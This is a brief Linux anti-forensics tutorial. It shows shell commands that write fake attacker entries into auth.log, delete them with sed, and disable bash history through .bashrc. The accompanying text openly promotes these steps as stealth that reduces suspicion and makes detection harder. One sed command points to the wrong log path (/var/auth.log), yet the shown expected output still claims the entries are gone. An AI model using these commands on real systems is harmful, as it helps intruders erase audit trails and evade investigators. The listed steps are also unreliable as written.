# Simulate Malicious Entry in auth.log
echo "Aug 1 10:00:00 host sshd[1234]: Failed password for invalid user attacker from 192.168.1.100 port 12345 ssh2" | sudo tee -a /var/log/auth.log
echo "Aug 1 10:01:00 host sudo: attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash" | sudo tee -a /var/log/auth.log
# Remove Specific Entries with sed
sudo sed -i '/192.168.1.100/d' /var/log/auth.log
sudo sed -i '/sudo: attacker/d' /var/auth.log
# Verify Removal
grep -i "attacker" /var/log/auth.log
# Expected Output: (No results for removed entries)
# Persistent Bash History Clearing
echo "HISTFILESIZE=0" >> ~/.bashrc
echo "HISTSIZE=0" >> ~/.bashrc
source ~/.bashrc
Surgical Log Editing

Using tools like sed allows for precise removal of specific lines, leaving the surrounding log context intact and reducing suspicion.

Bash History Persistence

Modifying .bashrc to set HISTFILESIZE and HISTSIZE to 0 prevents future commands from being recorded, offering persistent stealth.

Key Takeaway

Selective log editing and persistent history clearing are crucial for stealthy anti-forensics on Linux, making detection significantly harder.
